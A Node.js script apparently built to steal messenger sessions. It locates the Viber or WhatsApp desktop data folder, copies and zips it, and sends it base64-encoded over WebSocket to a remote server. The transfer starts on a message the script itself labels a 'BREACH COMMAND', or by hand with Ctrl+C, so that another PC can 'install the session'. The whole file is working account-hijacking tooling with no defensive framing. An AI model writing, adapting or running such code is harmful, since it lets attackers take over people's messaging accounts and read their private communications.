// Laptop Session Sender
// Usage: node laptop-sender.js

const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const os = require('os');

// CONFIGURATION: SERVER IP can be provided via ENV (SERVER_IP), fallback to localhost
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = 8080;

// Load config profiles
let appConfig = null;
try {
    const cfgPath = path.join(__dirname, '..', 'config.json');
    if (fs.existsSync(cfgPath)) {
        appConfig = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
    }
} catch {}

function resolveProfile(appName) {
    const profiles = (appConfig && appConfig.profiles) || {};
    const name = (appName || 'viber').toLowerCase();
    if (name === 'whatsapp') {
        const def = (appConfig && appConfig.defaults && appConfig.defaults.whatsappProfile) || 'whatsapp_classic';
        return { key: def, data: profiles[def] };
    }
    return { key: 'viber', data: profiles['viber'] };
}

function getDataPath(profile) {
    const p = profile.data || {};
    if (p.dataPathRelative) {
        return path.join(os.homedir(), ...p.dataPathRelative);
    }
    return path.join(os.homedir(), 'AppData', 'Roaming', 'ViberPC');
}

let ws = null;
let currentApp = 'viber';

console.log('\n═══════════════════════════════════════════════════');
console.log('VIBER SESSION SENDER (LAPTOP)');
console.log('═══════════════════════════════════════════════════\n');

// Check if app data exists
function checkAppData(appName) {
    const profile = resolveProfile(appName);
    const dataPath = getDataPath(profile);
    if (!fs.existsSync(dataPath)) {
        console.error('ERROR: App data folder not found!');
        console.error('Expected path:', dataPath);
        console.error('\nMake sure:');
        console.error('  1. Приложение установлено на этом компьютере');
        console.error('  2. Вы хотя бы раз запускали клиент и авторизовались');
        console.error('  3. Клиент сейчас залогинен\n');
        process.exit(1);
    }
    console.log('✓ Data folder found:', dataPath);
    const size = getDirectorySize(dataPath);
    console.log(`✓ Session size: ${(size / 1024 / 1024).toFixed(2)} MB\n`);
}

// Calculate directory size
function getDirectorySize(dirPath) {
    let totalSize = 0;
    
    function calculateSize(currentPath) {
        try {
            const files = fs.readdirSync(currentPath);
            files.forEach(file => {
                const filePath = path.join(currentPath, file);
                const stats = fs.statSync(filePath);
                if (stats.isDirectory()) {
                    calculateSize(filePath);
                } else {
                    totalSize += stats.size;
                }
            });
        } catch (error) {
            // Skip files that can't be accessed
        }
    }
    
    calculateSize(dirPath);
    return totalSize;
}

// Archive Viber folder
function archiveApp(appName) {
    return new Promise((resolve, reject) => {
        console.log('Creating session archive...');

        const safeName = (appName || 'viber').toLowerCase();
        const archiveFile = `${safeName}_session.zip`;
        const output = fs.createWriteStream(archiveFile);
        const archive = archiver('zip', { zlib: { level: 9 } });

        let tempCopyDir = null;
        let progressInterval;

        function cleanupTemp() {
            try {
                if (tempCopyDir && fs.existsSync(tempCopyDir)) {
                    fs.rmSync(tempCopyDir, { recursive: true, force: true });
                }
            } catch {}
        }

        output.on('close', () => {
            clearInterval(progressInterval);
            const sizeMB = (archive.pointer() / 1024 / 1024).toFixed(2);
            console.log(`✓ Archive created: ${sizeMB} MB\n`);
            cleanupTemp();
            resolve(archiveFile);
        });

        archive.on('error', (err) => {
            clearInterval(progressInterval);
            console.error('ERROR: Archive creation failed:', err.message);
            cleanupTemp();
            reject(err);
        });

        archive.on('progress', (progress) => {
            const percent = ((progress.fs.processedBytes / progress.fs.totalBytes) * 100).toFixed(1);
            process.stdout.write(`\rArchiving: ${percent}%`);
        });

        try {
            // Make a temporary copy first to avoid EBUSY locks
            const profile = resolveProfile(appName);
            const sourceDataPath = getDataPath(profile);
            const zipRoot = (profile.data && profile.data.zipRootName) || 'ViberPC';
            tempCopyDir = path.join(os.tmpdir(), `viber_session_copy_${Date.now()}`);
            fs.mkdirSync(tempCopyDir, { recursive: true });
            const tempCopyPath = path.join(tempCopyDir, zipRoot);
            console.log('Copying session to temp location before zipping...');
            fs.cpSync(sourceDataPath, tempCopyPath, { recursive: true });

            archive.pipe(output);
            archive.directory(tempCopyPath, zipRoot);
            archive.finalize();
        } catch (err) {
            console.error('ERROR: Failed to prepare temporary copy:', err.message);
            cleanupTemp();
            reject(err);
        }
    });
}

// Send session via WebSocket
async function sendSession() {
    try {
        console.log('═══════════════════════════════════════════════════');
        console.log('INITIATING SESSION TRANSFER');
        console.log('═══════════════════════════════════════════════════\n');
        
        // Create archive
        const archivePath = await archiveApp(currentApp);
        
        // Read archive as Base64
        console.log('Reading archive...');
        const fileData = fs.readFileSync(archivePath);
        const base64Data = fileData.toString('base64');
        
        console.log('Transmitting data...');
        console.log(`Transfer size: ${(base64Data.length / 1024 / 1024).toFixed(2)} MB\n`);
        
        // Send via WebSocket
        ws.send(JSON.stringify({
            type: 'session_data',
            data: base64Data,
            size: fileData.length,
            timestamp: Date.now(),
            app: currentApp
        }));
        
        console.log('✓ Session transmitted successfully!');
        console.log('✓ PC should now install the session\n');
        
        // Clean up temporary archive
        fs.unlinkSync(archivePath);
        console.log('✓ Temporary files cleaned\n');
        
    } catch (error) {
        console.error('ERROR: Session transfer failed:', error.message);
    }
}

// Connect to server
function connectToServer() {
    console.log(`Connecting to server: ws://${SERVER_IP}:${SERVER_PORT}`);
    
    ws = new WebSocket(`ws://${SERVER_IP}:${SERVER_PORT}`);
    
    ws.on('open', () => {
        console.log('✓ Connected to server\n');
        
        // Register as laptop
        ws.send(JSON.stringify({ type: 'register', device: 'laptop' }));
        
        console.log('Waiting for breach command from PC...');
        console.log('(Press Ctrl+C to send session manually)\n');
    });
    
    ws.on('message', (data) => {
        const message = JSON.parse(data);
        
        // Received command from PC
        if (message.type === 'send_session') {
            currentApp = (message.app || 'viber').toLowerCase();
            console.log('\n═══════════════════════════════════════════════════');
            console.log(`BREACH COMMAND RECEIVED FROM PC [APP=${currentApp}]`);
            console.log('═══════════════════════════════════════════════════\n');
            checkAppData(currentApp);
            sendSession();
        }
        
        if (message.type === 'registered') {
            console.log('✓ Registered as LAPTOP\n');
        }
    });
    
    ws.on('error', (error) => {
        console.error('\nERROR: Connection failed:', error.message);
        console.error('\nCheck:');
        console.error(`  1. Server is running (node server.js)`);
        console.error(`  2. Server IP is correct: ${SERVER_IP}`);
        console.error('  3. Both devices are on the same network');
        console.error('  4. Firewall allows port 8080\n');
    });
    
    ws.on('close', () => {
        console.log('\nConnection closed\n');
    });
}

// Manual send on Ctrl+C
process.on('SIGINT', async () => {
    console.log('\n\nManual session transfer initiated...\n');
    if (ws && ws.readyState === WebSocket.OPEN) {
        await sendSession();
        setTimeout(() => {
            console.log('Exiting...\n');
            process.exit(0);
        }, 2000);
    } else {
        console.log('ERROR: Not connected to server\n');
        process.exit(0);
    }
});

// Start
connectToServer();
